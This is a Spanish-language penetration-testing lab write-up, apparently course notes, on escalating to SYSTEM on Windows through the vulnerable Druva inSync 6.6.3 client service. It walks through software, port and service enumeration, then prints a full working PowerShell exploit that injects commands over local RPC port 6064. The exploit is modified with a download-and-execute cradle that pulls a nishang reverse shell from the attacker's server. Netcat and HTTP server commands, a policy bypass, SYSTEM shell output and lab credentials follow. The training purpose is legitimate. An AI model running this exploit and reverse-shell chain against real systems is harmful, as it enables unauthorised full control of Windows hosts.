
# Servicios vulnerables en Windows

Es posible que podamos escalar privilegios en sistemas bien configurados y con parches adecuados si se permite a los usuarios instalar software o si se utilizan aplicaciones o servicios de terceros vulnerables en toda la organización. Es habitual encontrar una multitud de aplicaciones y servicios diferentes en estaciones de trabajo de Windows durante nuestras evaluaciones. Veamos un ejemplo de un servicio vulnerable que podríamos encontrar en un entorno del mundo real. Algunos servicios o aplicaciones pueden permitirnos escalar a SYSTEM. Por el contrario, otros podrían provocar una condición de denegación de servicio o permitir el acceso a datos confidenciales, como archivos de configuración que contienen contraseñas.

***

### **Enumeración de programas instalados**

Como se mencionó anteriormente, comencemos enumerando las aplicaciones instaladas para tener una idea del asunto.

```
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

El resultado parece ser en su mayoría estándar para una estación de trabajo con Windows 10. Sin embargo, se destaca la aplicación `Druva inSync`. Una búsqueda rápida en Google muestra que la versión `6.6.3` es vulnerable a un ataque de inyección de comandos a través de un servicio RPC expuesto. Es posible que podamos usar [esta](https://www.exploit-db.com/exploits/49211) PoC de explotación para escalar nuestros privilegios. En esta [publicación del blog](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) que detalla el descubrimiento inicial de la falla, podemos ver que Druva inSync es una aplicación que se usa para "copia de seguridad integrada, eDiscovery y monitoreo de cumplimiento", y la aplicación cliente ejecuta un servicio en el contexto de la cuenta privilegiada `NT AUTHORITY\SYSTEM`. La escalada es posible al interactuar con un servicio que se ejecuta localmente en el puerto 6064.

### **Enumeración de puertos locales**

Realicemos una enumeración adicional para confirmar que el servicio se está ejecutando como se espera. Un vistazo rápido con `netstat` muestra un servicio ejecutándose localmente en el puerto `6064`.

```powershell
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### **Enumeración del ID del proceso**

A continuación, asignamos el ID del proceso (PID) `3324` al proceso en ejecución.

```powershell
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### **Enumeración de servicios en ejecución**

En este punto, tenemos suficiente información para determinar que la aplicación Druva inSync está efectivamente instalada y funcionando, pero podemos hacer una última comprobación utilizando el cmdlet `Get-Service`.

```powershell
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

***

## <mark style="color:purple;">Ejemplo: Escalada de privilegios locales en el cliente Windows de Druva inSync</mark>

### **PoC de PowerShell de Druva inSync**

Con esta información en la mano, probemos el exploit PoC, que es este breve fragmento de PowerShell.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### **Modificación de PowerShell PoC**

Para nuestros propósitos, queremos modificar la variable `$cmd` con el comando deseado. Podemos hacer muchas cosas aquí, como agregar un usuario administrador local (que es un poco ruidoso y queremos evitar modificar cosas en los sistemas cliente siempre que sea posible) o enviarnos un shell inverso. Probemos esto con [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) . Descarga el script en la de atacante y cambia el nombre por algo simple como `shell.ps1`. Abre el archivo y agrega lo siguiente en la parte inferior del archivo del script (cambiando la IP para que coincida con nuestra dirección y el puerto de escucha también):

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modifique la variable `$cmd` en el script PoC del exploit Druva inSync para descargar nuestro shell inverso de PowerShell en la memoria.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### **Iniciar un servidor web Python**

A continuación, inicie un servidor web Python en el mismo directorio donde `script.ps1`reside nuestro script.

```shell-session
afsh4ck@kali$ python3 -m http.server 8080
```

### **Captura de un shell SYSTEM**

Por último, inicie un listener de `Netcat` en la máquina de atacante y ejecute el script de PowerShell de PoC en el host de destino (después de [modificar la política de ejecución de PowerShell](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) con un comando como `Set-ExecutionPolicy Bypass -Scope Process`). Obtendremos una conexión de reverse shell con privilegios `SYSTEM` si todo sale según lo planeado.

```bash
afsh4ck@kali$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32> whoami

nt authority\system


PS C:\WINDOWS\system32> hostname

WINLPE-WS01
```

Este ejemplo muestra lo arriesgado que puede ser permitir que los usuarios instalen software en sus máquinas y cómo siempre debemos enumerar el software instalado si nos encontramos en un servidor o un host de escritorio de Windows. Las organizaciones deben restringir los derechos de administrador local en las máquinas de los usuarios finales siguiendo el principio del mínimo privilegio. Además, una herramienta de lista blanca de aplicaciones puede ayudar a garantizar que solo se instale software debidamente examinado en las estaciones de trabajo de los usuarios.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.44 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y la contraseña "HTB_@cademy_stdnt!"
```

> Siga los pasos anteriores para aumentar los privilegios en el sistema de destino mediante la falla `Druva inSync`. Envíe el contenido de la flag en la carpeta `VulServices` en el escritorio del administrador.

#### PoC de DruvainSync

Nos copiamos el siguiente código y creamos un archivo como `druva.ps1` en el host de destino:

{% hint style="warning" %}
Hemos modificado la variable cmd, que descargará el archivo `shell.ps1` de nuestra máquina Kali Linux
{% endhint %}

```powershell
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.11:8080/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Nos descargamos este script en Kali Linux, y lo guardamos como `shell.ps1`:

{% embed url="<https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>" %}

Editamos el archivo y abajo del todo le añadimos la siguiente línea para que apunte a nuestra IP y puerto de escucha:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 4444
```

#### Abrir listener de Netcat y servidor local en Python

```shell-session
afsh4ck@kali$ nc -nlvp 4444
```

```shell-session
afsh4ck@kali$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

<figure><img src="/files/q2KfFShf9qoWESGFhKIG" alt=""><figcaption></figcaption></figure>

#### Ejecutar druva.ps1 en la máquina objetivo

```
./druva.ps1
```

{% hint style="info" %}
Parece que nos da un error de ejecución pero el exploit funciona y nos devuelve una shell como SYSTEM
{% endhint %}

#### Recibiendo la shell SYSTEM

<figure><img src="/files/PZvGHXWAG9DKbY0e9F4Z" alt=""><figcaption></figcaption></figure>

#### Acceso a la flag

```powershell
PS C:\WINDOWS\system32> cd c:/Users/Administrator/Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          6/4/2021   6:00 PM                VulServices                                                          
d-----          6/4/2021   6:00 PM                WeakPerms    
```

```powershell
PS C:\Users\Administrator\Desktop> cd VulServices
PS C:\Users\Administrator\Desktop\VulServices> dir

    Directory: C:\Users\Administrator\Desktop\VulServices


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/4/2021   6:01 PM             33 flag.txt                                                             


PS C:\Users\Administrator\Desktop\VulServices> type flag.txt
Aud1t_th0se_th1rd_**************
```
